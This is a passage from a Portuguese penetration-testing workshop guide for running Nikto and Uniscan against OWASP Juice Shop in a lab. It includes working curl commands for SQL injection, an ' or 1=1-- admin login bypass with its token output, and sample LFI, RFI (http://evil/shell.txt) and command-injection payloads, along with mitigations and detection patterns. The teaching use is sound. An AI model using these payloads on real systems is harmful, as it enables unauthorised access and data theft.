docker exec atacante_kali sh -lc 'curl -sS http://172.18.0.30:3000/rest/user/login -H "Content-Type: application/json" --data-binary @/tmp/evidencias/workshop-05/login-payload.json | grep -E "token|umail|bid"'
```

Esperado: `"token":"eyJ..."` e e-mail de usuario (ex.: admin) — **conta comprometida** sem senha valida.

```text
Coleta (Dirb/Nikto/WhatWeb)          Exploracao rapida (curl)
        |                                    |
   /ftp confirmado  ----------------->  acquisitions.md confidencial
   SPA + APIs       ----------------->  SQLi em /rest/products/search
   (nao .htpasswd)  ----------------->  bypass em /rest/user/login
```

**Frase para sala:** "O scanner achou 25 coisas; em cinco minutos provamos **tres** — vazamento em `/ftp`, SQLi e login bypass. O resto era ruido de SPA."

---

## 7. Fase 5: Testes Complementares com Uniscan

Apos Nikto (misconfiguracoes e caminhos conhecidos), o Uniscan entra como **scanner de vetores web classicos**: tenta **injetar payloads** em parametros de URL e formularios para achar **SQLi**, **LFI**, **RFI** e **RCE** — falhas onde a entrada do usuario altera consulta SQL, inclusao de arquivo ou execucao de comando.

**O que e o Uniscan:** ferramenta open source (CLI, projeto historico `uniscan.sourceforge.net`) com **plugins** de teste. Cada plugin carrega uma lista de payloads e os envia ao alvo, observando se a resposta muda (erro SQL, conteudo de arquivo, etc.). No Kali desta aula: pacote `uniscan` em `/usr/bin/uniscan`. Nao substitui o analista — em SPAs modernas a confirmacao quase sempre cai no **`curl` manual** (Fase 6).

**Papel nesta trilha:**

```text
Fase 4 (Nikto)     -->  triagem: caminhos, cabecalhos, arquivos "interessantes"
        |
        v
Fase 5 (Uniscan)   -->  ataque leve automatizado: SQLi/LFI/RFI/RCE em URL com parametro
        |
        v
Fase 6 (curl)      -->  prova de impacto (SQLi, bypass) com payload escolhido pelo analista
```

### Como o Uniscan testa (e por que falha em SPA)

O Uniscan **nao analisa codigo-fonte**. Ele repete o padrao:

```text
Plugin (ex.: SQL Injection tests)
    -->  lista de payloads (?q=' OR 1=1--, ?file=../../etc/passwd, ...)
    -->  envia GET/POST para a URL informada (-u)
    -->  compara resposta (erro, tamanho, palavra-chave)
    -->  se bater com heuristica do plugin, reporta
```

| Tipo de teste | Flag Uniscan (resumo) | O que tenta | Exemplo de payload (conceito) |
|---|---|---|---|
| **SQLi** | `-s` | Quebrar consulta SQL no parametro | `'`, `OR 1=1--`, `'));` |
| **LFI** | (plugins estaticos) | Ler arquivo local via parametro | `../../../etc/passwd` |
| **RFI** | (plugins estaticos) | Incluir URL externa | `http://evil/shell.txt` |
| **RCE** | (plugins estaticos) | Execucao remota via parametro vulneravel | `;id`, `|whoami` |
| **Diretorios** | padrao / `-q` | Achar pasta inexistente com **404** de referencia | Falha em SPA (Passo 7.1) |

**Quem alimenta os padroes:** plugins embutidos no pacote `uniscan` (listas de payloads e assinaturas de erro), mantidos pelo projeto open source — mesma **filosofia** do Nikto/Nmap NSE: catalogo publico, nao inteligencia contra o seu alvo especifico.

### O que o Uniscan faz bem — e o que nao faz

| Faz bem | Nao faz (ou faz mal) nesta aula |
|---|---|
| Testar **um endpoint com parametro** (`?q=`, `?id=`, `?file=`) com dezenas de payloads rapidos | Entender **JavaScript**, rotas Angular ou fluxo de login na SPA |
| Sinalizar possivel SQLi/LFI quando o corpo da resposta muda | Confirmar impacto sozinho — muitos alertas sao **ruido** |
| Demonstrar **automacao de vetores estaticos** em aula | Substituir OWASP ZAP em aplicacao moderna com sessao/JWT complexa |
| Complementar Nikto (que quase nao injeta payloads) | Descobrir `/ftp` ou subdominios (papel do Dirb/Amass) |

### Onde e quando usar o Uniscan

| Contexto | Uso recomendado | Observacao |
|---|---|---|
| **Apps web classicas** (PHP, ASP, parametros GET visiveis) | Bom primeiro passo para SQLi/LFI em formularios e links | O caso de uso original da ferramenta |
| **API REST com query string** (esta aula) | Apontar `-u` para `/rest/products/search?q=` | Juice Shop tem SQLi aqui, mas Uniscan pode **nao** exibir o erro — `curl` confirma |
| **SPA sem 404 real** (Juice Shop) | Teste de diretorio **pula** — esperado | Registrar como limite tecnico (Passo 7.1) |
| **Producao** | Somente com autorizacao; payloads sao **intrusivos** | Pode disparar WAF/IDS |

### Severidade tipica e validacao

| Saida do Uniscan | Severidade usual | O que fazer nesta aula |
|---|---|---|
| Plugin carregado, sem alerta claro | N/A | Normal no Juice Shop — **nao** significa "seguro" |
| Mensagem de possivel SQLi/LFI | **Media** (hipotese) | Confirmar com `curl` na Fase 6 (Passo 8.2) |
| Directory check skipped (SPA) | Informativo | Documentar limitacao da ferramenta |
| RCE/LFI "confirmado" pelo plugin | **Alta** (se validado) | Reproduzir manualmente antes do relatorio |

```text
Uniscan injeta payloads  -->  resposta mudou?  -->  analista reproduz com curl  -->  relatorio
```

**Comparacao rapida Nikto x Uniscan (esta aula):**

| | **Nikto** | **Uniscan** |
|---|---|---|
| Pergunta | "Existe misconfig/caminho/cabecalho ruim?" | "Algum parametro aceita injecao?" |
| Metodo | Milhares de GET com regras | Payloads em URL/parametro |
| Juice Shop | 25 indicios; muitos falso + SPA | Diretorio pulado; SQLi melhor com `curl` |
| Confirmacao | `curl -sI`, ler corpo | `curl` com payload exato (Fase 6) |

> [!NOTE]
> Nesta aula o Uniscan cumpre papel **didatico**: mostrar que existe ferramenta entre "triagem Nikto" e "exploit manual". O **impacto** que entra no relatorio vem da Fase 6, nao da saida truncada do Uniscan.

### Passo 7.1: Entender limites do Uniscan em SPAs

O Uniscan foi projetado para aplicacoes web classicas. Em SPAs como o Juice Shop, testes de diretorio podem ser pulados quando a aplicacao nao retorna `404` da forma esperada.

Resultado observado com `uniscan -q`:

```text
Directory check:
Skipped because http://172.18.0.30:3000/uniscan813/ did not return the code 404
```

**Analise:** isso nao significa falha da aula; significa **limite da ferramenta** contra arquitetura moderna. Registre esse comportamento no relatorio como discussao tecnica.

### Passo 7.2: Executar testes web e estaticos em endpoint REST

Direcione o Uniscan para um endpoint com parametros:

```bash
docker exec atacante_kali sh -lc 'timeout 180 uniscan -u http://172.18.0.30:3000/rest/products/search?q=test -ws 2>&1 | tee /tmp/evidencias/workshop-05/uniscan-sqli.txt | tail -25'
```

**Componentes dos comandos:**

- `-w`: testes web.
- `-s`: testes de SQL Injection.
- `timeout 180`: evita travamento da aula.

**Resultado observado:**

```text
| Static tests:
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.1 Loaded.
```

**Analise:** mesmo sem confirmar automaticamente a SQLi, o Uniscan mostra a intencao de testar vetores estaticos. A confirmacao final permanece com `curl` na fase seguinte.

**Como validar o Passo 7.2:** `uniscan-sqli.txt` gravado; saida lista plugins **LFI/RFI/RCE** carregados; scan termina sem travar (`timeout 180`).

### Painel resumo — Fase 5

| Item | Criterio |
|---|---|
| Entendeu limite SPA | `Directory check: Skipped` documentado |
| Uniscan executado em REST | `-u .../rest/products/search?q=test -ws` |
| Evidencia gravada | `uniscan-sqli.txt` |
| Conclusao para relatorio | Uniscan = **tentativa automatizada**; SQLi **confirmada** na Fase 6 com `curl` |

```text
Nikto  = o que esta exposto / mal configurado
Uniscan = o parametro aceita injecao?
curl   = prova o impacto (SQLi, bypass)
```

---

## 8. Fase 6: Validacao Manual e Exploracao Controlada

> [!CAUTION]
> Esta fase deve ser executada exclusivamente contra o OWASP Juice Shop em ambiente controlado.

### Passo 8.1: Exposicao de informacao em /ftp

Com base no **Passo 5.3.2** (listagem e leitura inicial de `/ftp`), documente aqui o **impacto** para o relatorio final:

```bash
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/ftp | grep -Eo "href=\"[^\"]+\"" | head -15 | tee /tmp/evidencias/workshop-05/ftp-listing.txt'
docker exec atacante_kali sh -lc 'curl -s http://172.18.0.30:3000/ftp/acquisitions.md | head -12 | tee /tmp/evidencias/workshop-05/ftp-acquisitions.txt'
```

**Saida observada:**

```text
href="ftp/acquisitions.md"
href="ftp/announcement_encrypted.md"
href="ftp/incident-support.kdbx"
href="ftp/legal.md"
href="ftp/suspicious_errors.yml"

# Planned Acquisitions
> This document is confidential! Do not distribute!
```

**Analise:** aqui ha impacto real de **divulgacao de informacao**. O scanner de diretorio encontrou um caminho que expõe documentos internos ficticios. Este e um excelente exemplo de como DAST em CLI pode levar a achados de negocio, nao apenas tecnicos.

### Passo 8.2: Validar SQL Injection no endpoint de busca

```bash
docker exec atacante_kali sh -lc 'curl -sS -G "http://172.18.0.30:3000/rest/products/search" --data-urlencode "q='\'')));" | grep -Ei "SQLITE|syntax|error" | head -5 | tee /tmp/evidencias/workshop-05/sqli-erro.txt'
```

**Saida observada:**

```text
<title>Error: SQLITE_ERROR: near &quot;)&quot;: syntax error</title>
<h2><em>500</em> Error: SQLITE_ERROR: near &quot;)&quot;: syntax error</h2>
```

**Analise:** a validacao manual confirma que a entrada do parametro `q` interfere na consulta SQL. Nenhum scanner automatizado desta aula substitui essa evidencia.

### Passo 8.3: Demonstrar impacto com login bypass

```bash
docker exec atacante_kali sh -lc 'printf "%s\n" "{\"email\":\"'\'' or 1=1--\",\"password\":\"qualquer\"}" > /tmp/evidencias/workshop-05/login-payload.json'
docker exec atacante_kali sh -lc 'curl -sS -i -H "Content-Type: application/json" --data-binary @/tmp/evidencias/workshop-05/login-payload.json http://172.18.0.30:3000/rest/user/login | tee /tmp/evidencias/workshop-05/login-bypass.txt | sed -n "1,18p"'
```

**Saida observada:**

```text
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"authentication":{"token":"eyJ...","bid":1,"umail":"admin@juice-sh.op"}}
```

Extraia os campos principais:

```bash
docker exec atacante_kali sh -lc 'grep -E "HTTP/|umail|token" /tmp/evidencias/workshop-05/login-bypass.txt | head -5'
```

**Analise:** o bypass de autenticacao administrativa comprova impacto sobre **confidencialidade** e **controle de acesso**. Esta e a demonstracao de exploracao mais forte da aula.

### Passo 8.4: Encadear achados dos scanners com exploracao

```text
Amass levanta contexto de dominio
        ↓
WhatWeb confirma aplicacao moderna
        ↓
Dirb encontra /ftp e robots.txt
        ↓
Nikto reforca caminhos e misconfiguracoes
        ↓
Uniscan tenta vetores estaticos no endpoint REST
        ↓
curl valida SQLi e bypass de login
        ↓
/ftp comprova exposicao de informacao sensivel
```

**Analise:** esta cadeia diferencia a aula de um simples "rodar scanner". O aluno aprende a **correlacionar ferramentas** e fechar com evidencia de impacto.

---

## 9. Fase 7: Matriz de Evidencias e Leitura Profissional

### 9.1 Matriz minima de evidencias

| ID | Ferramenta | Evidencia | Finalidade |
|---|---|---|---|
| E01 | Amass + hackertarget | `amass-execucao.txt` e `osint-owasp-org.txt` | Fluxo Amass + coleta OSINT real |
| E02 | WhatWeb | `whatweb-juice.txt` | Fingerprint da aplicacao |
| E03 | Dirb | `dirb-juice.txt` | Descoberta de `/ftp` |
| E04 | Nikto | `nikto-juice.txt` | Alertas DAST automatizados |
| E05 | Uniscan | `uniscan-sqli.txt` | Testes estaticos em endpoint REST |
| E06 | curl | `ftp-acquisitions.txt` | Exposicao de informacao |
| E07 | curl | `sqli-erro.txt` | Validacao de SQL Injection |
| E08 | curl | `login-bypass.txt` | Impacto em autenticacao |

Listar evidencias coletadas:

```bash
docker exec atacante_kali sh -lc 'ls -lh /tmp/evidencias/workshop-05/'
```

### 9.2 Oportunidades de melhoria no processo

| Ponto observado | Melhoria sugerida |
|---|---|
| Nikto demora ~6 minutos (`352 s`) | Varredura completa sem filtro; aguardar `25 items reported` |
| Uniscan limitado em SPA | Direcionar para endpoints REST com parametros |
| Amass sem resultado (lab e dominios reais) | Passo 4.4 obrigatorio com `hackertarget` + `owasp.org` |
| Muitos falsos positivos do Nikto | Exigir validacao manual obrigatoria no relatorio |
| Evidencias apenas em `/tmp` do container | Copiar para volume persistente no host |

Copiar evidencias para o host:

```bash
docker cp atacante_kali:/tmp/evidencias/workshop-05 ./evidencias-workshop-05
```

---

## 10. Mitigacao, Deteccao e Hardening

### 10.1 Correcoes na aplicacao

1. Remover directory listing e exposicao de `/ftp`.
2. Restringir acesso a arquivos internos e backups.
3. Implementar consultas parametrizadas em endpoints REST.
4. Validar e sanitizar o parametro `q` em `/rest/products/search`.
5. Nao retornar erros SQL ao cliente.
6. Implementar autenticacao robusta em `/rest/user/login`.
7. Revisar `robots.txt` como politica declarativa, nao como controle de seguranca.

### 10.2 Correcoes operacionais e de scanner

1. Executar scanners apenas em escopo autorizado e janela definida.
2. Preferir CLI em pipelines de CI/CD com relatorios versionados.
3. Combinar Amass + DAST + validacao manual em metodologia unica.
4. Ajustar wordlists e tempo de scan conforme criticidade do alvo.
5. Registrar versao de cada ferramenta no relatorio.

### 10.3 Deteccao de varredura e exploracao

Monitore eventos como:

```bash
docker logs --tail 300 lab_juice_shop 2>&1 | grep -Ei 'ftp|search|login|sql|union|error'
ss -antp | grep ':3000'
```

Padroes compativeis com a aula:

- alto volume de `GET` em poucos minutos;
- acesso repetido a caminhos como `/ftp`, `/users.json`, `/.htpasswd`;
- erros `SQLITE_ERROR` no endpoint de busca;
- autenticacao anomala em `/rest/user/login`.

**Analise:** em producao, correlacione logs de WAF, aplicacao e proxy reverso em SIEM.

---

## 11. Encerramento e Criterios de Avaliacao

### Modelo minimo de relatorio do aluno

| Secao | Conteudo esperado |
|---|---|
| Identificacao | Nome, turma, data, host e container atacante |
| Escopo | IP/URL do Juice Shop e ferramentas utilizadas |
| Metodologia | Sequencia Amass -> WhatWeb -> Dirb -> Nikto -> Uniscan -> curl |
| Achados | Caminhos expostos, alertas e falhas validadas |
| Exploracao | `/ftp`, SQLi e login bypass |
| Impacto | Informacao, autenticacao e confidencialidade |
| Mitigacao | Correcoes tecnicas e operacionais |
| Conclusao | Limites dos scanners e aprendizados |

### Criterios de avaliacao sugeridos

| Criterio | Peso sugerido |
|---|---:|
| Preparacao do `atacante_kali` | 15% |
| Execucao correta dos scanners CLI | 25% |
| Correlacao entre achados | 20% |
| Validacao manual e exploracao controlada | 25% |
| Qualidade das evidencias e relatorio | 15% |

### Sintese final do workshop

Esta aula demonstra que DAST nao se resume a uma unica ferramenta grafica. A linha de comando com **Amass**, **Dirb**, **Nikto** e **Uniscan** permite construir uma investigacao modular, auditavel e facilmente automatizavel.

A licao central permanece a mesma da disciplina:

```text
Scanner encontra.
Analista valida.
Profissional comprova.
Especialista documenta e resolve.
```

---

## Checklist de Validacao da Aula

- Confirmei que estou no host `srvdocker01`.
- Confirmei o container `atacante_kali` na rede `docker_lab_vulneravel`.
- Instalei e validei `nikto`, `amass`, `uniscan`, `dirb`, `whatweb` e `libpostal-data`.
- Identifiquei `lab_juice_shop` em `172.18.0.30:3000`.
- Criei `/tmp/evidencias/workshop-05` no atacante.
- Executei Amass passivo em `juice-sh.op` e coletei subdominios via hackertarget (Passo 4.4).
- Executei WhatWeb e registrei fingerprint da aplicacao.
- Executei Dirb e identifiquei `/ftp`.
- Analisei `robots.txt` e a contradicao com `/ftp` exposto.
- Executei Nikto e registrei os alertas principais.
- Executei Uniscan em endpoint REST.
- Validei exposicao de arquivos em `/ftp/acquisitions.md`.
- Reproduzi erro SQL em `/rest/products/search`.
- Executei login bypass em `/rest/user/login`.
- Registrei token e `admin@juice-sh.op` como evidencia de impacto.
- Copiei evidencias para o host e discuti mitigacao.

---

<p align="right">
  <sub></sub><br>
  <img src="https://hits.sh/github.com/charles-josiah/Aulas/blob/master/2026-04-Vulnerabilidades_e_Testes_de_Invasao/Workshops/05-DAST_CLI_Nikto_Amass_Uniscan_e_exploracao_juiceshop.md.svg?label=leituras&color=eeeeee&labelColor=f5f5f5" alt="contador de leituras">
</p>